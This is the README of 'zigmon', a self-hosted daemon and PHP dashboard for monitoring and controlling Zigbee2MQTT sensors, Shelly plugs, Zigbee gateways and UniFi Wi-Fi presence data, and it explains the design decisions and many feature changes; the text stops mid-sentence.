# zigmon

Monitoring, history and control for every sensor that reaches an MQTT broker
through Zigbee2MQTT — and, optionally, for Shelly WiFi devices publishing to
the same broker. The same shape as `upsmon`: a Python daemon that owns the
data, SQLite for history, and a PHP dashboard behind nginx that only relays
JSON.

* `install.sh` — sets the whole thing up on AlmaLinux 9, and can upgrade or remove it
* `zigmon.py` — the daemon and the command-line tool, one file (standard library + paho-mqtt)
* `web/index.php`, `web/zigmon-api.php` — the dashboard and its thin API client
* `deploy/` — systemd unit, logrotate rules, sample configuration, nginx server block
* `INSTALL.md` — the AlmaLinux 9 walkthrough, by hand

## Installing

```bash
sudo ./install.sh
```

Packages, service user, configuration, the broker account, systemd unit, log
rotation, nginx with TLS, php-fpm, SELinux, firewall, and a check that it all
works. `--dry-run` shows what it would do, `--upgrade` replaces the program
files, `--uninstall` removes it while keeping the recorded history. Every
question has a command-line option; `--help` lists them.

## How the pieces fit

```
Zigbee sensors ──► SLZB-06 ──► Zigbee2MQTT ──┐
                                             │      AlmaLinux 9
Shelly WiFi (H&T, Plug) ─────────────────────┤   ┌────────────────────────────────────────┐
                                             ▼   │ zigmon.service   (user "zigmon")       │
                                        mosquitto│   subscribes to zigbee2mqtt/#, shellies/#│
                                       1883/8883 │   writes /var/lib/zigmon/history.db    │
                                             ────►   serves 127.0.0.1:9849, token-guarded │
                                                 │        ↑                               │
                                                 │ php-fpm ← nginx :443 ← browser         │
                                                 └────────────────────────────────────────┘
```

The daemon is the only thing that talks to the broker. PHP relays JSON and
holds no credentials; the two endpoints that change something (opening the
network for joining, erasing history) send a token read from a file the
browser never sees, and ask who is signed in on top (see *Signing in*).
Nothing in the chain needs root.

## What it watches

**Every device Zigbee2MQTT knows.** The bridge's device list gives the model,
vendor, description and — through the "exposes" definition — the label and
unit of every value the device reports. Nothing is specific to a model: a
temperature sensor, a button, a contact, a plug with power metering all land
in the same tables and on the same dashboard. New devices appear by
themselves the moment they pair.

**Shelly smart plugs**, optionally, over local RPC exactly as upsmon does it:
the watts actually being drawn, voltage, current, power factor, frequency,
the plug's own temperature, the energy total and the runtime and switching
counters. Any number of plugs; each can be switched and its counters reset
from the dashboard, and **a Zigbee button can be bound to it** — single press
toggles the fridge, long press switches it off, whatever you set up on the
Control tab. The editor offers only devices that can send an action, and for
each one the exact actions its Zigbee2MQTT definition declares (plus any it
has actually sent), so nothing has to be typed or guessed.

**Shelly WiFi sensors**, three ways, all optional: over MQTT (anything under
`shellies/<name>/status/…`), polled over RPC when the sensor has an address
and answers (an H&T on USB power), or **pushed by webhook** from a battery
sensor that sleeps and cannot be polled — the daemon can listen for those
on a port of its own, exactly as upsmon did.

**The bridge itself**: online/offline, version, channel, whether the network
is open for joining, and the events it publishes (join, leave, interview,
rename).

## Why it is built this way

**Readings are rows, not columns.** `(device, key, value)` rather than a fixed
schema, because what one sensor reports is not what the next one does, and a
device added next month should need no code change.

**History is keyed by address, not by name.** Renaming a device in
Zigbee2MQTT keeps its history; the rename shows up as an event. A device that
reports before the bridge has listed it is filed under its name and moved
across when the address arrives.

**SQLite in two layers.** Full-resolution samples for a fortnight, hourly
averages with min and max for two years. A year of history for a dozen
sensors is a few megabytes, and a year-long chart costs a few hundred rows.

**A bursty device does not flood the table.** Readings arriving within
`sample_interval` of the previous one replace it rather than adding a row —
some devices send four messages for one measurement.

**Availability is inferred as well as reported.** Zigbee2MQTT publishes
`availability` when that feature is on; when it is not, a device that has
been silent longer than a battery sensor's reporting interval is flagged
anyway. A device that reports is by definition reachable, whatever the last
availability message said.

**Button presses are events, not readings.** `action` values go to the event
log with a timestamp; there is nothing to chart in a press.

**Button bindings run in the daemon, not the browser.** A press arrives over
MQTT, the daemon looks the binding up and talks to the plug over RPC; nothing
depends on a dashboard being open. Each switch is an event with the button
and the action that caused it.

**A plug reset is verified, not assumed.** The plug answers
`Switch.ResetCounters` with success whether or not it understood the counter
name, so the values are read back and compared.

**Requests to a plug are paced.** Gen3 firmware with authentication answers
429 when requests arrive closer together than about a second, and the digest
challenge is reused rather than renegotiated on every call.

**A missed reading does not blank the panel.** The last values stay on screen,
greyed out and dated, and after a restart they come from the recorded
snapshots until a fresh reading lands.

**The daemon never gives up.** paho reconnects to the broker by itself with
backoff; the systemd unit restarts the daemon without limit if it ever
crashes; a broker that is down for an hour simply means an hour without data.

**An error inside an endpoint answers rather than raises.** The dashboard
polls every five seconds; one bad payload from one device must not stop the
feed or bury the journal.

## The dashboard

Six tabs. **Overview**: counts, bridge state, permit-join state, a socket
panel per plug with a switch and its live figures, a card per sensor with its
main readings, battery, signal and last report — a button's card shows the
**last press, big**, with which button and how long ago, glowing green for a
moment when it lands (live, under a second), and its gestures as small
chips; a multi-button remote is folded to "4 buttons" plus each gesture
once instead of a 28-item list — and 6h/24h/7d charts of
temperature and humidity across all devices. **History**: pick a
device, pick 6 hours to a year, one chart per value it reports. **Devices**:
the table. **Events**: joins, leaves, renames, availability changes, button
presses, bridge state. **Control**: open or close the Zigbee network, switch each plug and reset
its counters, edit the button bindings, erase recorded data, forget a device
— all behind a sign-in. **All values**: everything
every device reports, with the description Zigbee2MQTT gives for it.

**The overview can be rearranged.** While editing is unlocked, drag any
socket row or device card where you want it; the order is saved the moment
you drop it (`POST /api/order`), lives in the daemon, and every browser sees
the same layout. Newly added devices go to the end. While locked, dragging
is off.

Every Zigbee device also shows **which router or coordinator it talks
through** — "via Router" on its Overview card (hover for the link quality
and how fresh the information is) and a "Connected through" line on All
values. The daemon asks Zigbee2MQTT for the raw network map every
`networkmap_interval` seconds (default 300, `0` turns it off; the answer
also survives a restart), so after moving a device or adding a router give
it a few minutes to reflect re-parenting.

Charts read each series' own rhythm: a thermometer that wakes every four
hours draws an unbroken line, and lines are always continuous, start to finish, whatever a source's
rhythm. Shading real outages on top — where a normally chatty source went
quiet for a while — is an opt-in setting (`chart_outages` in
config.json, or Settings on the dashboard); off by default, it applies to
every chart at once.

**Three more tabs join Plugs: Sensors and Buttons.** Every non-plug device
that reports measurements lives on Sensors; every button/remote lives on
Buttons. Both are full catalogs, unlocked-editable and reorderable by drag,
independent of Overview.

**Overview is yours to design.** While unlocked, an "Add to Overview" row
lets you place any plug, sensor, or button onto Overview; a small × on each
card removes it, and dragging reorders freely — plugs and sensor/button
tiles can sit in any order together. A fresh install shows everything (the
same combined view as before), so nothing looks empty until you start
customizing; from the first add or remove, Overview remembers your own
layout in the daemon, shared across every browser. It has nothing to do
with the Plugs/Sensors/Buttons tabs, which always show the full catalog.

**Zigbee gateways** now cover two kinds of hardware: a SMLIGHT SLZB-06 or
similar (plain HTTP JSON on `/ha_info`/`/ha_sensors`) and a **Shelly device
with the Zigbee component acting as a router** — e.g. a Power Strip 4
Gen4 — read over the same local JSON-RPC API (`/rpc`, digest auth) already
used for Shelly plugs, via `Shelly.GetStatus`, `Zigbee.GetStatus` and
`Zigbee.GetConfig`. **Detect** tries the SLZB path first and falls back to
the Shelly one automatically, remembers which one answered (`kind` in
`config.json`), and — for a router — offers the matching device on the
mesh as the target if there is exactly one, or one whose model matches
what Detect read. `zigmon gateway <name> dump` and the background poller
follow the same two-protocol logic, so a Shelly-based gateway needs no
extra setup once Detect has run once.

**Zigbee gateways** (a SMLIGHT SLZB-06 or similar) can be read over the
network for their own health — uptime, board temperature, Wi-Fi/Ethernet
and socket state — on top of what Zigbee2MQTT reports. Add one on the
Control tab, in **Zigbee gateways** (name, address, and — if the device's
"web server authentication" is switched on — a username and password sent
as HTTP Basic Auth), or in `config.json` for a read-only entry:

```json
"zigbee_gateways": [
  {"name": "Router", "host": "192.168.1.51", "target": "Router",
   "username": "admin", "password": "..."}
]
```

`target` is either the name an existing Zigbee router already has (its
readings *extend* that device — nothing is duplicated) or the literal
string `"coordinator"` for the local coordinator, which has no device row
of its own and gets a small synthetic one. `username`/`password` are
optional and only needed when the gateway's own web login is enabled.
Polled every `gateway_poll_interval` seconds (default 30) from the
documented `/ha_info` and `/ha_sensors` endpoints, plus `/metrics` (the
device's own Prometheus output — free heap, board temperature, Wi-Fi RSSI
and whatever else the firmware exposes, parsed generically since the
format is self-describing). Whatever comes back lands under a `gw.` prefix
in All values and gets recorded to history too — free heap over time is
often the earliest sign of a coordinator that is about to lock up. **Detect** on the row does the
same from the dashboard: it reads model, firmware, radio and mode, fills
the name if empty and suggests the target (coordinator, or the one router
on the mesh). Run
`zigmon gateway <name> dump` (or `--host <ip> dump` for one not yet in
config.json) to see exactly what your firmware returns before relying on
any particular field.

**A multi-relay strip reads as one box.** Its header carries what is the
box's — model, firmware, address, mains voltage and frequency, box
temperature, total power, Wi-Fi — and each channel row underneath shows
only its own power, current, energy, on-time and switch count, with the
same full-size switch button a single plug has. **Find Shelly devices → Add**
runs Detect on the spot, so a found box arrives with the right kind,
its relays and their names.

**Plugs are added as devices, not as relays.** In Plugs and sensors one
block is one box: address, password and a *device state* entered once.
**Detect** asks the box what it is (model, MAC, firmware) and how many
relays it has, and lays out one channel row per relay with the names the
device itself uses — a Pro 4PM becomes four channels in one click. The
device state wins: *monitor only* or *disabled* there applies to every
channel and locks their selects; *enabled* lets each channel keep its own
choice (a single channel can still be monitor-only or disabled). Passwords,
addresses and the device state are stored once per channel underneath, so
bindings, rules, history and the strip ordering on the Plugs tab work
exactly as before (the whole strip is dragged; channels reorder inside it).
In `config.json` the same is `"host_state": "enabled|monitor|disabled|optional"`
on each channel entry.

**A device that may be unplugged.** The fourth device state, *enabled, may
be unplugged* (`"host_state": "optional"`), is for a box that loses power
as part of normal life — a lamp on a switched outlet, a plug behind a
socket that gets turned off. It behaves exactly like *enabled* while the
box answers. When it stops answering, nothing is treated as a fault: no
warning event, no notification, no place in *needs attention*, the device
stays *ok*; its socket row goes grey and says *unplugged* with the last
reading, and bindings, rules and schedules aimed at it fail fast and
quietly (a two-second probe instead of the full timeout, so no thread and
no other device waits on it). It keeps being probed on the normal poll
interval, so the moment it has power again it is live — readings, switch,
bindings — with an *answering again* line in the log and nothing else to
clean up.

**Silence quiet-alerts for buttons** (Settings → Alert thresholds, on by
default) — a button or remote only reports when pressed, so going quiet for
hours or days is normal for it, not a fault. With this on, buttons never
turn WARN/CRIT or count toward "needs attention" just for being silent;
switch it off to get the old behavior back. Plugs were already exempt.

**On/off is a switch, everywhere.** One iOS-style toggle is used for every
enable/disable in the dashboard: the boolean settings (outage shading,
chart icons, daily backup, Zigbee2MQTT in the backup), the notification
categories and per-device custom picks, and — new — an enabled switch at
the start of every binding, rule and schedule row: off keeps the row but
the daemon ignores it (dimmed in the list). Backup time is a time picker,
tokens are masked, numbers have sensible steps.

**The way to a device's charts** is always the same small chart icon in
the top-right corner of its card or row, shown on hover — never the name,
never the whole card (a plug's row has the switch on it). It is on by
default and can be switched off per kind under Settings → Charts or in
`config.json` (`link_plugs`, `link_sensors`, `link_buttons`).

**Click the status pill** (or the Needs-attention card) for the details
behind it: a dialog listing every problem in one place — broker or bridge
down, each device flagged by a threshold with the reason and its last
report, every unreachable plug with the error — worst first; a device name
opens its History. When all is well it says so, with a one-line summary.

**Forget this device works without visiting Devices first.** The list it
offers was filled while the Devices tab was painted, so once painting became
per-tab that list stayed empty for anyone who went straight to Control, and
the button did nothing at all. It is filled from Control as well now, and
says which of the two went wrong instead of failing quietly.

**A tick paints only the tab you are looking at**, and only the parts
whose data actually changed (each grid and editor keeps a signature of its
slice of state; "x min ago" texts repaint once a minute). A hidden tab is
painted the moment it is shown. With a few dozen devices a refresh costs a
few milliseconds instead of hundreds, so a click on a socket repaints in
~30 ms even on a big mesh.

**`zigmon --map` scans the mesh on demand.** The map is otherwise refreshed
every `networkmap_interval` seconds (five minutes by default, `0` turns it
off), which is fine to live with but slow to wait for after moving a device.
The command asks Zigbee2MQTT for a fresh scan, waits for the answer, and
prints who talks through whom — and if the bridge does not answer in time it
says so and shows what it last knew.

**One coordinator, not two.** The coordinator is not listed as a device of
its own — a gateway entry stands in for it — but anything Zigbee2MQTT
published under its friendly name used to be adopted as a separate, silent
record, so it appeared twice and the gateway's Target offered a choice
between two things that were the same. Its name now points at the one
record, an existing stray copy is folded away on the next device list, and
Target lists the coordinator once. It also carries what Detect read — model
and firmware under its name, like every other device — and the network map
calls it by that name rather than the bare word `coordinator`. Any device a
gateway extends does the same: a range extender reads
`SMLIGHT SLZB-06Mg26U · Router · v3.3.8.dev3` rather than just `Router`,
in its card and in the Devices table. The firmware is added to what
Zigbee2MQTT already says rather than replacing it, so the two never fight
over the row.

**Rules compare with `=` and `≠` too**, next to the four inequalities — for
a reading that is a state rather than a level. Equality is matched with the
tolerance floats need, so a sensor reporting 21.0 matches a 21 typed in.

**A gateway poll no longer hides a silent mesh.** When a device's record is
extended by a gateway read over the network, that poll also refreshed the
“last report” age — so a router whose Zigbee side had gone quiet still looked
seconds fresh. The two are now tracked apart, and when they drift more than
two minutes the card says `Zigbee 30 min ago` next to the age, so the mesh
cannot hide behind Wi-Fi. A router with nothing of its own to report is only
heard from when the bridge pings it, every ten minutes or so, so under a
quarter of an hour the note is plain grey; it turns orange past that.

**A WiFi tab, for looking at.** Between Devices and Events, tiles for the
controller, each access point and each wireless network, and a list of
everything joined — with the ones assigned to a person marked. An access
point tile carries its clients per radio and channel, processor, memory and
uptime, and each one is recorded as a device of its own, so its history
charts like any sensor and it can be dragged onto the Overview.

The device list is a summary: it names the features and the interfaces
(“ports”, “radios”) without giving either, so each access point is read a
second time for the radios that carry its channel, width and Wi-Fi
generation, and for its ports — which are reported even where the controller gives a
socket's rating but not its live speed, or names a port without saying
whether it is up. If the tab is emptier than the controller's own pages, `zigmon --wifi-probe`
shows the outline of its replies — the field names, with the
values shortened and anything that looks like a key left out. Those names
have moved between firmware revisions, and guessing at them from the outside
is exactly how an empty tab happens: a controller answering
`features: ["accessPoint"]` was being compared against `ACCESS_POINT` and
every device it listed was quietly dropped. Spellings are now compared
without case or punctuation, the SSID is taken from whichever key carries
it, and a controller whose devices are not recognised at all says so on the
tab rather than showing nothing.

**The access points can be asked directly.** The controller's key interface
will not say which network a client is on, nor its signal or channel; the
points themselves know all three. Under **Control → Presence**, switch on
*Read them over SSH*, give the username they use, and either a password or a
key — which can be **generated here**, its public half shown for pasting
into the controller under Settings → System → Device SSH Authentication and
its private half downloadable once, or uploaded if you already have one.
Their addresses come from the controller, so nothing has to be typed twice.
Switching this on also **stops the controller being signed in to**: the
sign-in existed to get exactly these three things, and a controller that
locks an account out after a few failures is not worth troubling for
something already in hand. A setup carried over from before is moved to the
API key on its own and says so in Events. `zigmon --wifi-probe` reports on
the points now rather than on a sign-in nothing is using.

Each point also measures its own way out — latency, jitter and packet loss
to the gateway and to whatever carries it — which is how an access point
that is fine in itself but sits behind a bad wire tells you so; the
controller cannot see that at all. It says which switch and port it is
plugged into, where it sends its reports and what went wrong the last time
it could not, and how it is bearing up: how much of the flash's write life
is gone, why it last started, whether it has ever crashed, its board
revision and its addresses.

Some of it is turned into something to act on rather than only read. The
spectrum scan says how busy every channel in each band is, so a radio
sitting on a crowded one is shown the **quieter channels going spare** — on
a 2.4 GHz radio at 35% airtime, knowing channel 7 is at 18% is the whole
decision. A 5 GHz radio on a **radar channel** is marked DFS, because a
point told to leave one takes its network with it and that looks like a
fault. And a client's **retry rate** — how much of what it sends has to go
out again — catches one struggling long before its signal looks bad: an
iPad at –64 dBm repeating 18% of its frames is having a worse time than a
plug at –65 dBm repeating 2%.

What each point sees of the neighbourhood comes back too: every other
network on the air with its channel, width, signal and security, merged
across the points so one network seen twice is one line with the nearest
sighting, and listed on the tab with the ones sharing a channel with your
own marked — those are the ones dividing the airtime with you. Your own
networks are left out, including the hidden ones a point broadcasts, which
are recognised by the hardware their address comes from rather than by a
name they do not have. and the airtime in use and interference on each channel a radio
sits on. `info` is a shell function rather than a program on this firmware,
so several ways of asking are tried until one answers.

Nothing is ever written to a point. The commands are a fixed list in the
source — `info` and `mca-dump`, neither of which changes anything — and
none of it is built from anything typed or received; asking for anything
else is refused before a connection is made. What comes back fills in each client's network, signal, noise and margin,
channel, width, Wi-Fi generation, stream count, VLAN, negotiated rates,
retries, experience and whether it is dozing; each point's temperature per
radio, load, experience, serial, kernel and the speed and error counts of
its wired uplink; and the real number of clients on each network, which the
key interface cannot count at all. The field names follow a dump from a
U7-Pro rather than what looks likely — the channel and its width sit on each
wireless network, not on the radio; `signal` is dBm while `rssi` is the
margin above the noise floor; rates are counted in kilobits. A point that does not answer is noted on its own tile and the others carry
on. What they said is held between rounds: the controller is asked every
thirty seconds and the points every few minutes, and without that the signal
and the network would appear once and then vanish for the next several
rounds — which looked exactly like the reading being unreliable.

**A device is called what you called it.** The controller carries the name
somebody typed; the point reports the hostname the device announces for
itself. The first wins, and the second is shown beside it where the two
differ, so `iPhone16` stays `iPhone16` rather than turning into
`Jan--iPhone16` every few minutes.

How much is on show depends on which interface the controller is asked
over, and the tab says which one actually answered. Signing in is not free — the controller counts attempts and starts
answering `429 too many requests` — so a session is opened once and kept for
half an hour rather than signing in for every read, and never logged out,
since logging out is what forces the next read to sign in again. Twenty-two
reads now cost one sign-in instead of twenty-two. A sign-in that succeeds is not yet a session: UniFi OS wants a cross-site
token on every read, and that token rotates — a fresh one comes back under
`x-updated-csrf-token` rather than the name it was first sent under, so both
are watched for, and `/api/users/self` supplies it on the controllers that
withhold it from the sign-in altogether. The session is then **extended**
through `/api/auth/refresh`, the way the controller's own pages do, rather
than signed in again when it ages: twelve reads and four renewals cost one
sign-in. `rememberMe` is sent too, for the longer session it buys. Without it the sign-in
reports 200 and every read that follows reports 401, which looks like a
password problem and is not one. There are also two doors — UniFi OS answers
on `/api/auth/login`, the classic controller on `/api/login` — and a self-hosted server may refuse one
while letting the other through, so both are tried. A **rejected** username and password is a different matter from a busy
controller: it is tried once and then left alone until the stored details
change, because repeating a wrong password is exactly what locks an account
out of its own controller — and a controller answering
`AUTHENTICATION_FAILED_LIMIT_REACHED` is counting failed sign-ins, not
traffic, so that is read as a rejection too. Where the controller really is
asking for a pause it says for how long; that wait is honoured and doubles
with each refusal in a row, rather than being retried the moment it lapses
and renewing the lockout forever, and the key covers the gap. Reads are serialised and their answers held for a few seconds, so several
people looking at once, or somebody leaning on the refresh button, cost the
controller one round rather than one each: sixteen simultaneous polls make
one read of the clients, one of the devices and one sign-in. `zigmon
--wifi-probe` prints what the controller answers to each question, sign-in
included, for when the tab is thinner than it should be, and `zigmon --reset-order wifi` puts the cards back in their default
arrangement. The same command covers every set of cards that can be
rearranged — `overview`, `wifi`, `plugs`, `sensors`, `buttons`, `devices`,
`groups`, or `all` — and only forgets the order: nothing about the cards
themselves changes. **Access** offers three
choices: the API key, a username and password, or **both** — which signs in
for the fuller picture and keeps the key as the fallback, so a controller
that stops accepting the sign-in still fills the tab rather than emptying
it. The **API key** interface grew a great deal in 10.6: it lists the access
points with each radio's channel, width and Wi-Fi generation, the wireless
networks with their security and the VLAN behind each, and per client the
name, address, kind (wireless, wired, VPN or Teleport), whether it is a
guest, since when, and which access point carries it. What it does not report, on any version, is **which network a client is
joined to** — the access field on a client holds an authorisation type and
nothing else — nor its signal or channel. Where that is unknown it is left
blank rather than counted as nothing: a network nobody can be counted on
says so instead of claiming zero clients. Signing in with a **username and password** reaches what the controller's
own pages use: its `clients/active`, which already carries the signal, the
channel, the negotiated rates, the VLAN and the name of the access point —
with the older `stat/sta` as the fallback for controllers without it. That
shows: per client the
Wi-Fi generation and stream count, band, channel and channel width, signal,
throughput and total usage, experience and VLAN; per access point each radio
with its channel, width and airtime in use, its uplink and its experience;
and the real list of networks with their security, bands and the VLAN each
sits on — 6 GHz radios included, which the band mapping had been getting
wrong.

All of it is deliberately slow and second in line: the network is asked
about every three minutes on its own thread, readings are kept only when
they move, and nothing in the house waits on any of it. With a controller
that accepts a connection and then never answers, message handling stays at
0.10 ms and every reading still arrives.

**Presence: who is at home, and rules that care.** Whether a phone is on the
house Wi-Fi answers *is anyone in* well enough, and needs nothing installed
on the phone. **Control → Presence** takes a UniFi controller — an API key,
or a username and password on older firmware — lists the clients it can see,
and lets each one be assigned to a person. Someone is in when any of their
devices is on the network, so a watch or a laptop covers for a sleeping
phone.

Arriving is believed at once; leaving only after a grace period, ten minutes
by default. A phone parks its radio while its owner is asleep in the next
room, and without that delay the house would report them walking out every
night.

**A phone can be named instead of addressed.** Phones rotate their Wi-Fi
address now — iOS *Private Wi-Fi Address*, Android *randomised MAC* — and a
person listed by an address that has since changed is out for good, however
often the controller sees the phone under its new one. **+ by name** in
the People editor stores `name:iPhone16` instead: the device matches by
the name the controller shows, whatever its address is today. An **out**
tag says under it why the person counts as out — not among the clients
listed, last seen when, the grace that applies — so a wrong address or a
too-short *Gone after* is visible at a glance.

**A phone can say where it is itself.** The Wi-Fi has a floor: the
controller lists a phone a few seconds after it has joined, and only once it
has joined - by which time you are already inside. A handset's own geofence
trips while its owner is down the street. Switch **From their phone** on for
a person, press **Setup**, and you get two links to put in the handset:

    …/index.php?api=presence-report&state=home&token=…
    …/index.php?api=presence-report&state=away&token=…

**Setup** is the whole walkthrough, not just the links: the Location
Services setting the phone needs, each screen of the automation in order,
what to type where, how to test it, and what happens when. Every value that
belongs in the phone — the URL, the topic, the message with the token in it
— is a chip you tap to copy, and hovering one shows it as a **QR code** for
the phone to scan. That is as far as automation goes, and the limit is
Apple's: a personal automation cannot be shared or imported at all, and
since iOS 15 an unsigned shortcut file cannot be added to a phone either —
so the automation itself is always made by hand. The QR at least keeps a
24-character token from being typed twice. If a presence topic is set, the ntfy way is
what it walks through and the direct link is offered underneath; if not,
the other way round. Android is the same request from Tasker or MacroDroid. It travels over mobile data to the same address the dashboard
lives at, so a phone reports from the street, before it is on the Wi-Fi at
all.

The two sources are merged rather than swapped. **Arriving is taken at
once** - triggers fire, and the Wi-Fi confirms it moments later. **Leaving
is taken only if the controller cannot see them either**: a geofence that
wanders is common, and a phone sitting on the home network is not a phone
that has left, so a reported departure asks the controller once, quickly,
before it counts. A phone's word stands for half an hour unconfirmed, then
the Wi-Fi has the say again - a lost or flat handset cannot strand anybody.
Every *out* tag says which source decided it.

The token is what proves a request is that person's phone; it is per person,
never shown in the dashboard's own status, and *Make a new token* stops an
old link working. Losing one is worth what it can do: flip that person's
presence, and nothing else. Wrong tokens are counted and slowed to a crawl.

**Nothing has to be reachable from the internet for this.** Set a
**presence topic** on the Wi-Fi controller card - `https://ntfy.sh/` plus a
long random name - and the phone publishes `home <token>` there instead,
while the daemon holds an outbound stream to it. The topic is public, which
is why the token travels inside the message and why nothing but a name and a
state ever goes over it.

**Walking in is noticed before the hall sensor gets a word in.** The
controller is asked every *poll_s* (30 s by default, 3 s at the least) - and
for a minute after anybody has come or gone, every five seconds, since a
second person often walks in right behind the first. But
a rule limited to *nobody home* does not trust an answer that old: when it
is about to fire and the last look at the network is more than
`presence_fresh_s` old (4 s by default; `-1` switches this off), it asks
the controller again first, with a three-second timeout, and decides on
what it hears. Your phone joins the Wi-Fi at the door, the sensor trips two
seconds later, the rule asks, finds you in, and stays quiet. Only that rule
waits for the answer: rules run on a thread of their own and buttons,
reports and plugs never queue behind them.

What it is for:

- **Sensor rules take an `only when`**: nobody home, someone home, or one
  named person in or out. `motion` and `motion while the house is empty` are
  different things, and now they can be written differently.
- **Anything that switches something can send a notification instead** — a
  rule, a button, a scene, a schedule, a presence trigger.
- **Coming and going switches things**: per person, or once for the house
  when the first one gets in or the last one leaves. That last one is for
  turning everything off behind you.
- The Overview carries a chip per person, green when they are in, with the
  device they were seen as and when. `zigmon --presence` says the same on a
  terminal.

A gated rule stays quiet when nobody has been set up or the controller is
unreachable, rather than guessing. The key or password is stored in the
daemon's database and never sent back to the page — only whether one is
held. Presence settings travel in the settings backup with everything else.

**A button can take something over.** A light on a motion rule is a nuisance
the moment somebody wants it to stay on: they press the switch, and the
sensor turns it off again as they walk past. Switch **By hand** on for that
button's binding and while its press leaves the target on, rules, schedules
and window-closing leave it alone; the same button switching it off gives it
back. A pulse never takes anything over, and a hold expires by itself after
`manual_hold_s` (four hours by default, `0` for never) so a forgotten one
cannot strand a plug. The plug card shows `by hand` while it lasts, saying
who took it and how long is left, and clicking that gives it back at once.
When the binding's target is a scene or a sequence, the hold lands on every
light the scene switches, one by one and by what the scene did to each: the
ones it turned on are taken over, the ones it turned off are given back, a
toggle is read back to see where it landed. A scene of three lights pressed
by hand is then three holds, and the motion sensor over any of them keeps
its hands off until the same button (or the card) gives them back.

**A critical alert is logged in its own words.** That is the one somebody
comes back to and reads, so Events keeps the message as it was written, in
whatever language it was written in; what set it off is on the rule's own
line directly beneath, so nothing is lost. The quieter ones stay as the
daemon describing itself — `sent "Doorbell": a doorbell press` — rather than
repeating their words in the middle of its own English.

**One message, one alert, however many rules point at it.** The repeat
window silenced a duplicate notification but not the event or the band
behind it, so two rules watching the same sensor — an OR rule and the single
rule it replaced, say — raised the same alert twice while only telling you
once. The window now governs all three together. The rules editor also marks a rule when another one fires on exactly the
same crossing and does exactly the same thing to the same target. Only that:
a pair switching on above and off below is the pattern this very card
recommends, and a thermostat's dead band is two rules on one sensor by
design.

**Each side of an OR is its own event.** A rule fires when its condition
becomes true, and a pair joined by OR was treated as one condition: with two
motion sensors covering a hallway, whichever tripped second was never heard
while the first was still occupied — the combined condition had not stopped
being true, so there was no edge to fire on. Two separate rules worked,
which is the tell. Each side now carries its own edge, so both are
announced; AND keeps the combined edge, which is what it means. The event
and the message also name the reading that actually tripped rather than the
other sensor's, and a rule whose first source has never reported no longer
sits silent when its second one does.

**Nothing on the message path waits for the database.** A critical message
and a hand taking something over both record themselves in the settings
table, and that write stood behind the lock: during a VACUUM of a 135 MB
database one motion report took 770 ms to become an alert. Those writes now
join the same queue as events — the in-memory copy is updated at once, every
reader sees it, and the row lands when the lock is free. The same report
during the same VACUUM: 0.7 ms. The band of standing alerts is also
repainted only when the alerts change, not on every tick.

**A notification is not switched on.** Picking a message as the target now
hides the Do column, the pulse delay and the way-back threshold, and says
`sends the message` instead — in rules, button bindings, scenes, schedules
and presence triggers alike. They were offered before and meant nothing.

**Presence is worked out once a second, not once a rule.** A gated rule asks
who is home on every message it might match, and each ask rebuilt the whole
answer; with thirty such rules that halved what the message path could
carry. The answer can only change when the controller is asked again, so it
is held briefly: 11,400 messages a second back to 22,000.

**A request with no PIN is not a wrong PIN.** Anything privileged that
arrived without one was counted as a failed guess, so five stray requests —
a stale tab, a bug in the page — locked the owner out for five minutes with
“too many wrong PINs” while they were typing the right one. Only an actual
guess counts now; guessing is still limited exactly as before.

**Notifications say what you wrote.** *Messages*, under Alerts & energy, are
named texts picked as a target anywhere something is switched. Write
`{device}`, `{value}`, `{key}`, `{unit}`, `{label}`, `{target}`, `{action}`,
`{person}`, `{time}`, `{date}`, `{home}`, `{away}` or `{origin}` and the
facts of the moment are filled in — anything not known then is left out
rather than printed as a placeholder. The device that set it off also
offers `{model}`, `{battery}`, `{signal}`, `{temperature}`, `{humidity}`;
the moment offers `{weekday}`, `{sunrise}`, `{sunset}`, `{daylight}`
(day/night; the sun needs `latitude`/`longitude`), `{home_count}`; the
house offers `{attention}` (devices needing attention), `{attention_list}`,
`{alerts}` (standing critical alerts) and `{uptime}`.

**Any device, right now: `{Name.key}`.** Write the device's name as the
dashboard shows it (or its alias), a dot, and a key from *All values* —
`{Temp-Venek.temperature}`, `{Plug-UPS.switch.apower}`,
`{PIR-Vchod.occupancy}` — and the current reading is put in, whatever set
the message off. `{Name.state}` is on/off/unplugged of a plug or switch,
`{Name.age}` how long since it last reported, and `.battery`, `.signal`,
`.model`, `.name` work too. Names are matched case-insensitively; a device
or key that does not exist simply vanishes from the text. So a night-time
motion alert can read *Motion at {device}, outside {Temp-Venek.temperature}
°C, entrance light {Light-Vchod.state}*.

**The editor completes them like an IDE.** Type `{` in a message's text or
title (or press Ctrl+Space anywhere) and a list drops down at the cursor:
every fact with what it means and an example value taken from the live
dashboard, and every device by name. Keep typing to narrow it; Up/Down
move, Enter or Tab take, Esc closes. Taking a device puts `{Name.` in and
the list changes to that device's own readings with their current values —
`humidity → 71 %` — plus `state`, `age`, `battery`, `signal`, `model`,
`name`. The `{ } Facts` button shows the same catalogue grouped, with the
examples. Each says how long before the same message may be sent again, because a
tripping sensor will otherwise fill a phone, and whether it is **critical**:
sent at the highest priority the channel allows, written to Events as a
problem, and left standing in a band across the top of the page until
somebody clears it — which needs a sign-in, and leaves it in Events either
way. A notification arrives while you are asleep; the band is still there in
the morning. The text runs to as many lines as it needs, and two buttons put things into
it where the cursor is: **Facts** for the placeholders, so nobody has to
remember them, and **Emoji** for a symbol, which both channels carry. A
message can also carry its own heading and a picture — a camera snapshot,
say; the phone fetches that itself, so the address has to be reachable from
wherever the phone is. The card shows what each will read like as it is
typed, and sends one on demand. Without a message, the notification carries the automatic
description, which is fine for testing and poor at three in the morning.

**The coordinator's card reads like a router's.** It was the one device
whose card said “no measurements” while its gateway was being polled
perfectly well — it has no link quality and no parent, so it fell through to
the branch for a sensor with nothing to show. It now says it is holding the
network and carries the same board temperature, Wi-Fi and uptime a router
does, or, when no gateway is set up for it, says where to set one up.

**A router card shows what the box itself reports.** A range extender used
to show only that it routes, its link quality and how long it has been in
the network — anything read over its own network API sat in All values and
nowhere else. When a gateway is set up for it, the card now carries the few
figures worth a glance: the sockets of a strip added up, board temperature,
Wi-Fi, uptime. Keys differ per vendor, so they are matched by shape rather
than named one by one.

**A router shows its route too.** Only end devices have a parent; two
routers are siblings, so a mains-powered router used to show no route at
all - the one thing worth knowing about it. The network map's sibling links
are now read as well, and a router carries its strongest neighbour with the
wording to match: `next to coordinator` rather than `via`. The mesh tree
lists them under it.

**A Zigbee switch is told the state, not asked to flip.** Toggling now
sends the explicit `ON` or `OFF` the last report says is the opposite,
